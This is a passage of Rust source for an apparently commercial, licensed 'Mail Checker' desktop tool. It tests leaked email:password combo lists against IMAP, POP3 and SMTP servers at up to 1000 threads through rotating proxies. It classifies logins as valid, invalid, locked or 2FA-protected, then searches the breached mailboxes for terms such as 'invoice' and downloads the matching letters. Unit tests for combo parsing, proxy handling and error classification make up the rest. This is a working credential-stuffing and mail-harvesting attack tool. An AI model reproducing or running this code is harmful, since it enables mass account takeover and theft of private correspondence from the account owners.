    search_mode: String,
    #[serde(default)]
    action: String,
    #[serde(default)]
    id: u64,
    #[serde(default)]
    login: String,
    #[serde(default)]
    pass: String,
    #[serde(default = "default_true", alias = "use_auto")]
    use_auto: bool,
    #[serde(default, alias = "out_dir")]
    out_dir: String,
    #[serde(default = "default_true", alias = "use_shared_hosts")]
    use_shared_hosts: bool,
}

fn default_imap_port() -> u16 { 993 }
fn default_pop3_port() -> u16 { 995 }
fn default_smtp_port() -> u16 { 465 }
fn default_starttls_port() -> u16 { 587 }
fn default_auto_timeout() -> u64 { 1600 }
fn default_search_mode() -> String { "or".to_string() }

fn handle_ipc(body: String, proxy: EventLoopProxy<UserEvent>) {
    let msg: In = match serde_json::from_str(&body) {
        Ok(m) => m,
        Err(_) => return,
    };

    match msg.cmd.as_str() {
        "start" => {
            // Check EPP License status
            let lic = epp_api::get_cached_status();
            if !lic.active {
                let lic2 = epp_api::verify_license();
                if !lic2.active {
                    let _ = proxy.send_event(UserEvent::Eval("if(typeof openEppModal==='function')openEppModal();".into()));
                }
            }

            CANCEL.store(false, Ordering::SeqCst);
            PAUSED.store(false, Ordering::SeqCst);
            if let Ok(mut lock) = PAUSE_NOTIFY.0.lock() {
                *lock = false;
            }
            let run_id = RUN_ID.fetch_add(1, Ordering::SeqCst) + 1;
            BUSY.store(true, Ordering::SeqCst);

            let accounts = load_accounts_from_path_or_str(&msg.creds_path, &msg.creds);
            if accounts.is_empty() {
                BUSY.store(false, Ordering::SeqCst);
                let _ = proxy.send_event(UserEvent::Eval("window.finish();".into()));
                return;
            }
            let default_kind = match msg.proxy_type.to_lowercase().as_str() {
                "socks4" => ProxyKind::Socks4,
                "http" => ProxyKind::Http,
                "https" => ProxyKind::Https,
                _ => ProxyKind::Socks5,
            };
            let parsed_proxies = load_proxies_from_path_or_str(&msg.proxies_path, &msg.proxies, default_kind);
            let threads = if msg.threads == 0 {
                200
            } else {
                msg.threads.clamp(1, 1000)
            } as usize;
            let timeout_secs = if msg.timeout == 0 {
                10
            } else {
                msg.timeout.clamp(1, 120)
            } as u64;
            let timeout = Duration::from_secs(timeout_secs);
            let retries = msg.retries.min(10);
            let field = if msg.field.is_empty() {
                "SUBJECT".to_string()
            } else {
                msg.field
            };

            let auto_timeout = Duration::from_millis(if msg.auto_timeout == 0 { 1600 } else { msg.auto_timeout });

            let mut rules = msg.rules;
            if rules.is_empty() && !msg.term.trim().is_empty() {
                rules.push(SearchRule {
                    field: field.clone(),
                    term: msg.term.clone(),
                });
            }

            let cfg = RunCfg {
                threads,
                protocols: msg.protocols,
                use_proxies: msg.use_proxies,
                proxies: Arc::new(parsed_proxies),
                timeout,
                retries,
                field,
                term: msg.term.clone(),
                rules,
                search_mode: if msg.search_mode.is_empty() { "or".to_string() } else { msg.search_mode },
                use_auto: msg.use_auto,
                auto_learn: msg.auto_learn,
                auto_timeout,
                port_imap: if msg.port_imap == 0 { 993 } else { msg.port_imap },
                port_pop3: if msg.port_pop3 == 0 { 995 } else { msg.port_pop3 },
                port_smtp: if msg.port_smtp == 0 { 465 } else { msg.port_smtp },
                port_starttls: if msg.port_starttls == 0 { 587 } else { msg.port_starttls },
                auto_cache: AUTO_CACHE.clone(),
                use_shared_hosts: msg.use_shared_hosts,
            };
            let dir_name = if msg.out_dir.trim().is_empty() {
                "results".to_string()
            } else {
                sanitize(&msg.out_dir)
            };
            let out_dir = std::env::current_exe()
                .ok()
                .and_then(|p| p.parent().map(|d| d.join(&dir_name)))
                .unwrap_or_else(|| PathBuf::from(&dir_name));

            let has_search = !cfg.rules.is_empty() || !cfg.term.trim().is_empty();
            let out_arc = match open_out(&out_dir, has_search, &msg.term) {
                Ok(out) => {
                    let path_str = out_dir.to_string_lossy().replace('\\', "/");
                    let _ =
                        proxy.send_event(UserEvent::Eval(format!("window.outdir(\"{path_str}\");")));
                    Some(Arc::new(out))
                }
                Err(e) => {
                    let _ =
                        proxy.send_event(UserEvent::Eval(format!("window.outdir(\"ERR: {e}\");")));
                    None
                }
            };

            run_check(run_id, accounts, cfg, out_arc, proxy);
        }
        "pick_creds" => {
            let proxy = proxy.clone();
            std::thread::spawn(move || {
                if let Some(file) = rfd::FileDialog::new()
                    .add_filter("Text files", &["txt", "csv", "log"])
                    .pick_file()
                {
                    let path_str = file.to_string_lossy().to_string();
                    let file_name = file.file_name().and_then(|n| n.to_str()).unwrap_or("creds.txt");
                    let escaped_path = path_str.replace('\\', "/").replace('"', "\\\"");
                    let escaped_name = file_name.replace('"', "\\\"");

                    // Count lines quickly
                    let count = if let Ok(f) = std::fs::File::open(&file) {
                        use std::io::BufRead;
                        let reader = std::io::BufReader::with_capacity(1024 * 1024, f);
                        reader.lines().flatten().filter(|l| {
                            let t = l.trim();
                            !t.is_empty() && !t.starts_with('#') && t.contains(':')
                        }).count()
                    } else {
                        0
                    };

                    let js = format!("if(typeof window.onCredsFileSelected==='function')window.onCredsFileSelected(\"{escaped_path}\", \"{escaped_name}\", {count});");
                    let _ = proxy.send_event(UserEvent::Eval(js));
                }
            });
        }
        "pick_proxies" => {
            let proxy = proxy.clone();
            std::thread::spawn(move || {
                if let Some(file) = rfd::FileDialog::new()
                    .add_filter("Text files", &["txt", "csv", "log"])
                    .pick_file()
                {
                    let path_str = file.to_string_lossy().to_string();
                    let file_name = file.file_name().and_then(|n| n.to_str()).unwrap_or("proxies.txt");
                    let escaped_path = path_str.replace('\\', "/").replace('"', "\\\"");
                    let escaped_name = file_name.replace('"', "\\\"");

                    // Count lines quickly
                    let count = if let Ok(f) = std::fs::File::open(&file) {
                        use std::io::BufRead;
                        let reader = std::io::BufReader::with_capacity(512 * 1024, f);
                        reader.lines().flatten().filter(|l| {
                            let t = l.trim();
                            !t.is_empty() && !t.starts_with('#')
                        }).count()
                    } else {
                        0
                    };

                    let js = format!("if(typeof window.onProxiesFileSelected==='function')window.onProxiesFileSelected(\"{escaped_path}\", \"{escaped_name}\", {count});");
                    let _ = proxy.send_event(UserEvent::Eval(js));
                }
            });
        }
        "pause" => {
            PAUSED.store(true, Ordering::SeqCst);
            if let Ok(mut lock) = PAUSE_NOTIFY.0.lock() {
                *lock = true;
            }
        }
        "resume" => {
            PAUSED.store(false, Ordering::SeqCst);
            if let Ok(mut lock) = PAUSE_NOTIFY.0.lock() {
                *lock = false;
            }
            PAUSE_NOTIFY.1.notify_all();
        }
        "stop" => {
            PAUSED.store(false, Ordering::SeqCst);
            CANCEL.store(true, Ordering::SeqCst);
            if let Ok(mut lock) = PAUSE_NOTIFY.0.lock() {
                *lock = false;
            }
            PAUSE_NOTIFY.1.notify_all();
            RUN_ID.fetch_add(1, Ordering::SeqCst);
            BUSY.store(false, Ordering::SeqCst);
            let _ = proxy.send_event(UserEvent::Eval("window.finish();".into()));
        }
        "open_results" => {
            let dir_name = if msg.out_dir.trim().is_empty() {
                "results".to_string()
            } else {
                sanitize(&msg.out_dir)
            };
            let out_dir = std::env::current_exe()
                .ok()
                .and_then(|p| p.parent().map(|d| d.join(&dir_name)))
                .unwrap_or_else(|| PathBuf::from(&dir_name));
            let _ = std::fs::create_dir_all(&out_dir);
            #[cfg(target_os = "windows")]
            {
                let _ = std::process::Command::new("explorer").arg(&out_dir).spawn();
            }
            #[cfg(target_os = "macos")]
            {
                let _ = std::process::Command::new("open").arg(&out_dir).spawn();
            }
            #[cfg(all(not(target_os = "windows"), not(target_os = "macos")))]
            {
                let _ = std::process::Command::new("xdg-open").arg(&out_dir).spawn();
            }
        }
        "win" => {
            let action = match msg.action.as_str() {
                "close" => WinAction::Close,
                "min" => WinAction::Min,
                "max" => WinAction::MaxToggle,
                "drag" => WinAction::Drag,
                _ => return,
            };
            let _ = proxy.send_event(UserEvent::Win(action));
        }
        "letters" => {
            let acct = Acct {
                login: msg.login,
                pass: msg.pass,
            };
            let default_kind = match msg.proxy_type.to_lowercase().as_str() {
                "socks4" => ProxyKind::Socks4,
                "http" => ProxyKind::Http,
                "https" => ProxyKind::Https,
                _ => ProxyKind::Socks5,
            };
            let parsed_proxies = parse_proxies(&msg.proxies, default_kind);
            let timeout_secs = if msg.timeout == 0 {
                10
            } else {
                msg.timeout.clamp(1, 120)
            } as u64;
            let cfg = RunCfg {
                threads: 1,
                protocols: vec!["IMAP".into()],
                use_proxies: msg.use_proxies,
                proxies: Arc::new(parsed_proxies),
                timeout: Duration::from_secs(timeout_secs),
                retries: 0,
                field: msg.field.clone(),
                term: msg.term.clone(),
                rules: vec![],
                search_mode: "or".to_string(),
                use_auto: true,
                auto_learn: true,
                auto_timeout: Duration::from_millis(1600),
                port_imap: 993,
                port_pop3: 995,
                port_smtp: 465,
                port_starttls: 587,
                auto_cache: AUTO_CACHE.clone(),
                use_shared_hosts: msg.use_shared_hosts,
            };
            let id = msg.id;
            let field = if msg.field.is_empty() {
                "SUBJECT".to_string()
            } else {
                msg.field
            };
            let term = msg.term;
            let proxy_evt = proxy.clone();

            std::thread::spawn(move || match try_fetch(&acct, &cfg, &field, &term) {
                Ok(mails) => {
                    if let Ok(json) = serde_json::to_string(&mails) {
                        let _ = proxy_evt
                            .send_event(UserEvent::Eval(format!("window.letters({id}, {json});")));
                    }
                }
                Err(e) => {
                    let escaped = e
                        .replace('\\', "\\\\")
                        .replace('"', "\\\"")
                        .replace('\n', " ");
                    let _ = proxy_evt.send_event(UserEvent::Eval(format!(
                        "window.lettersError({id}, \"{escaped}\");"
                    )));
                }
            });
        }
        "epp_check" => {
            let proxy_evt = proxy.clone();
            std::thread::spawn(move || {
                let st = epp_api::verify_license();
                if let Ok(js) = serde_json::to_string(&st) {
                    let _ = proxy_evt.send_event(UserEvent::Eval(format!("window.eppLicenseStatus({js});")));
                }
            });
        }
        "epp_login" => {
            let proxy_evt = proxy.clone();
            let email = msg.login;
            let pass = msg.pass;
            std::thread::spawn(move || {
                let res = match epp_api::login(&email, &pass) {
                    Ok(st) => serde_json::json!({
                        "success": true,
                        "status": st,
                    }),
                    Err(e) => serde_json::json!({
                        "success": false,
                        "error": e,
                    }),
                };
                if let Ok(js) = serde_json::to_string(&res) {
                    let _ = proxy_evt.send_event(UserEvent::Eval(format!("window.eppLoginResult({js});")));
                }
            });
        }
        "epp_logout" => {
            epp_api::clear_token();
            let _ = proxy.send_event(UserEvent::Eval("window.eppLicenseStatus({ active: false, email: '', error: 'Вы вышли из аккаунта' });".into()));
        }
        _ => {}
    }
}

#[cfg(target_os = "windows")]
fn apply_dark_window_attributes(hwnd: *mut std::ffi::c_void) {
    #[link(name = "dwmapi")]
    extern "system" {
        fn DwmSetWindowAttribute(
            hwnd: *mut std::ffi::c_void,
            dw_attribute: u32,
            pv_attribute: *const std::ffi::c_void,
            cb_attribute: u32,
        ) -> i32;
    }

    unsafe {
        // 1. DWMWA_USE_IMMERSIVE_DARK_MODE = 20 (Win11 / Win10 20H1+) & 19 (older Win10)
        let dark_mode: i32 = 1;
        let _ = DwmSetWindowAttribute(hwnd, 20, &dark_mode as *const _ as *const _, 4);
        let _ = DwmSetWindowAttribute(hwnd, 19, &dark_mode as *const _ as *const _, 4);

        // 2. DWMWA_BORDER_COLOR = 34 (Windows 11) -> 0xFFFFFFFE (DWMWA_COLOR_NONE, suppress white frame)
        let color_none: u32 = 0xFFFFFFFE;
        let _ = DwmSetWindowAttribute(hwnd, 34, &color_none as *const _ as *const _, 4);

        // 3. DWMWA_CAPTION_COLOR = 35 -> RGB(26, 31, 30) = 0x001E1F1A
        let caption_color: u32 = 0x001E1F1A;
        let _ = DwmSetWindowAttribute(hwnd, 35, &caption_color as *const _ as *const _, 4);

        // 4. DWMWA_WINDOW_CORNER_PREFERENCE = 33 -> 2 (DWMWCP_ROUND)
        let corner: u32 = 2;
        let _ = DwmSetWindowAttribute(hwnd, 33, &corner as *const _ as *const _, 4);
    }
}

fn main() -> wry::Result<()> {
    #[cfg(target_os = "windows")]
    bundle_webview2_loader();

    let event_loop = EventLoopBuilder::<UserEvent>::with_user_event().build();
    let proxy = event_loop.create_proxy();

    let builder = WindowBuilder::new()
        .with_title("Mail Checker")
        .with_decorations(false)
        .with_resizable(false)
        .with_inner_size(LogicalSize::new(1180.0, 780.0))
        .with_min_inner_size(LogicalSize::new(1180.0, 780.0))
        .with_max_inner_size(LogicalSize::new(1180.0, 780.0));

    #[cfg(target_os = "windows")]
    let builder = builder.with_undecorated_shadow(false);

    let window = builder.build(&event_loop).unwrap();

    #[cfg(target_os = "windows")]
    apply_dark_window_attributes(window.hwnd() as *mut std::ffi::c_void);

    let ipc_proxy = proxy.clone();
    let webview = WebViewBuilder::new()
        .with_url("app://localhost/")
        .with_custom_protocol("app".into(), |_id, _req| {
            Response::builder()
                .header("Content-Type", "text/html")
                .body(std::borrow::Cow::Borrowed(PAGE.as_bytes()))
                .unwrap()
        })
        .with_background_color((10, 15, 13, 255))
        .with_ipc_handler(move |req: Request<String>| {
            handle_ipc(req.into_body(), ipc_proxy.clone());
        })
        .build(&window)?;

    event_loop.run(move |event, _, control_flow| {
        *control_flow = ControlFlow::Wait;
        match event {
            Event::UserEvent(UserEvent::Eval(js)) => {
                let _ = webview.evaluate_script(&js);
            }
            Event::UserEvent(UserEvent::Win(action)) => match action {
                WinAction::Close => *control_flow = ControlFlow::Exit,
                WinAction::Min => window.set_minimized(true),
                WinAction::MaxToggle => {}
                WinAction::Drag => {
                    let _ = window.drag_window();
                }
            },
            Event::WindowEvent {
                event: WindowEvent::CloseRequested,
                ..
            } => *control_flow = ControlFlow::Exit,
            _ => {}
        }
    });
}

#[cfg(target_os = "windows")]
fn bundle_webview2_loader() {
    use std::os::windows::ffi::OsStrExt;
    const DLL: &[u8] = include_bytes!("../WebView2Loader.dll");
    let dir = std::env::temp_dir().join("mck_runtime");
    if std::fs::create_dir_all(&dir).is_err() { return; }
    let path = dir.join("WebView2Loader.dll");
    // Rewrite only if size differs (avoid touching busy DLL on re-runs).
    let needs_write = std::fs::metadata(&path).map(|m| m.len() as usize != DLL.len()).unwrap_or(true);
    if needs_write { let _ = std::fs::write(&path, DLL); }
    let wide: Vec<u16> = dir.as_os_str().encode_wide().chain(std::iter::once(0)).collect();
    #[link(name = "kernel32")]
    extern "system" { fn SetDllDirectoryW(lp: *const u16) -> i32; }
    unsafe { SetDllDirectoryW(wide.as_ptr()); }
}

// ---------- UNIT TESTS ----------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_ignores_blank_and_comments() {
        let v = parse_accounts("a@x.ru:1\n\n# c\n b@y.com : pw \nbad_no_colon");
        assert_eq!(v.len(), 2);
        assert_eq!(v[0].login, "a@x.ru");
        assert_eq!(v[1].pass, "pw");
    }

    #[test]
    fn query_charset_and_quotes() {
        assert_eq!(build_query("SUBJECT", "hi"), "SUBJECT \"hi\"");
        assert_eq!(
            build_query("SUBJECT", "счёт"),
            "CHARSET UTF-8 SUBJECT \"счёт\""
        );
        assert_eq!(build_query("FROM", "a\"b"), "FROM \"a\\\"b\"");
    }

    #[test]
    fn dec_mime_word() {
        assert_eq!(dec(b"=?utf-8?B?0J/RgNC40LLQtdGC?="), "Привет");
    }

    #[test]
    fn parse_proxy_variants() {
        let p1 = parse_proxy("socks5://u:p@1.2.3.4:1080", ProxyKind::Http).unwrap();
        assert_eq!(p1.kind, ProxyKind::Socks5);
        assert_eq!(p1.host, "1.2.3.4");
        assert_eq!(p1.port, 1080);
        assert_eq!(p1.user.as_deref(), Some("u"));
        assert_eq!(p1.pass.as_deref(), Some("p"));

        let p2 = parse_proxy("1.2.3.4:1080:u:p", ProxyKind::Socks5).unwrap();
        assert_eq!(p2.kind, ProxyKind::Socks5);
        assert_eq!(p2.host, "1.2.3.4");
        assert_eq!(p2.port, 1080);
        assert_eq!(p2.user.as_deref(), Some("u"));
        assert_eq!(p2.pass.as_deref(), Some("p"));

        let p3 = parse_proxy("1.2.3.4:1080", ProxyKind::Http).unwrap();
        assert_eq!(p3.kind, ProxyKind::Http);
        assert_eq!(p3.host, "1.2.3.4");
        assert_eq!(p3.port, 1080);
        assert_eq!(p3.user, None);

        assert!(parse_proxy("garbage", ProxyKind::Socks5).is_none());
    }

    #[test]
    fn classification_tests() {
        assert_eq!(
            classify("[AUTHENTICATIONFAILED] Invalid credentials"),
            Cat::Invalid
        );
        assert_eq!(
            classify("application-specific password required"),
            Cat::TwoFA
        );
        assert_eq!(classify("connection timed out"), Cat::Timeout);
        assert_eq!(classify("account has been locked"), Cat::Locked);
    }

    #[test]
    fn country_heuristics() {
        assert_eq!(country("mail.ru"), "RU");
        assert_eq!(country("x.de"), "DE");
        assert_eq!(country("user.gmail.com"), "UN");
    }

    #[test]
    fn host_resolutions() {
        assert_eq!(hosts_for("gmail.com").imap, vec!["imap.gmail.com"]);
        assert_eq!(
            hosts_for("acme.io").pop3,
            vec!["pop.acme.io", "pop3.acme.io", "mail.acme.io"]
        );
        assert_eq!(hosts_for("interia.pl").imap, vec!["poczta.interia.pl"]);
    }

    #[test]
    fn sanitize_test() {
        assert_eq!(sanitize("invoice #1/2"), "invoice_1_2");
        assert_eq!(sanitize("___"), "search");
    }

    #[test]
    fn auto_discovery_test() {
        let cache = Mutex::new(HashMap::new());
        let (hosts, is_auto) = discover_hosts("custom-company.de", true, false, Duration::from_millis(1600), &cache);
        assert!(is_auto);
        assert!(hosts.imap.contains(&"imap.custom-company.de".to_string()));
    }

    #[test]
    fn microsoft_domain_and_linked_detection() {
        assert!(is_microsoft_domain("outlook.com"));
        assert!(is_microsoft_domain("hotmail.com"));
        assert!(is_microsoft_domain("live.ru"));
        assert!(is_microsoft_domain("msn.com"));
        assert!(is_microsoft_domain("outlook.fr"));
        assert!(is_microsoft_domain("office365.com"));
        assert!(!is_microsoft_domain("gmail.com"));
        assert!(!is_microsoft_domain("yandex.ru"));

        let hosts = Hosts {
            imap: vec!["outlook.office365.com".into()],
            pop3: vec![],
            smtp: vec!["smtp.office365.com".into()],
        };
        assert!(is_microsoft_linked("custom-corp.com", &hosts));

        let non_ms_hosts = Hosts {
            imap: vec!["imap.custom.com".into()],
            pop3: vec!["pop.custom.com".into()],
            smtp: vec!["smtp.custom.com".into()],
        };
        assert!(!is_microsoft_linked("custom.com", &non_ms_hosts));
    }

    #[test]
    fn url_encode_special_chars() {
        assert_eq!(url_encode("test@outlook.com"), "test%40outlook.com");
        assert_eq!(url_encode("p@$$w0rd!#"), "p%40%24%24w0rd%21%23");
        assert_eq!(url_encode("simple-user_1.0~"), "simple-user_1.0~");
    }

    #[test]
    fn search_rule_structure() {
        let rule = SearchRule {
            field: "SUBJECT".into(),
            term: "invoice".into(),
        };
        let json = serde_json::to_string(&rule).unwrap();
        let deserialized: SearchRule = serde_json::from_str(&json).unwrap();
        assert_eq!(rule, deserialized);
    }
    // Сетевой тест: реально ходит в gmail. Запуск: `cargo test -- --ignored`.
    #[test]
    #[ignore]
    fn network_check_gmail_authfail() {
        let acct = Acct {
            login: "nobody@gmail.com".into(),
            pass: "definitelywrong123".into(),
        };
        let cfg = RunCfg {
            threads: 1,
            protocols: vec!["IMAP".into()],
            use_proxies: false,
            proxies: Arc::new(vec![]),
            timeout: Duration::from_secs(10),
            retries: 0,
            field: "SUBJECT".into(),
            term: "".into(),
            rules: vec![],
            search_mode: "or".to_string(),
            use_auto: true,
            auto_learn: true,
            auto_timeout: Duration::from_millis(1600),
            port_imap: 993,
            port_pop3: 995,
            port_smtp: 465,
            port_starttls: 587,
            auto_cache: Arc::new(Mutex::new(HashMap::new())),
            use_shared_hosts: false,
        };
        let r = check_account(1, &acct, &cfg);
        assert_eq!(
            r.category, "invalid",
            "ожидали category==invalid, получили: {:?}",
            r
        );
        let e = r.error.to_lowercase();
        assert!(
            e.contains("credential") || e.contains("authenticationfailed") || e.contains("auth"),
            "ожидали ошибку аутентификации от gmail, получили: {}",
            r.error
        );
    }
}
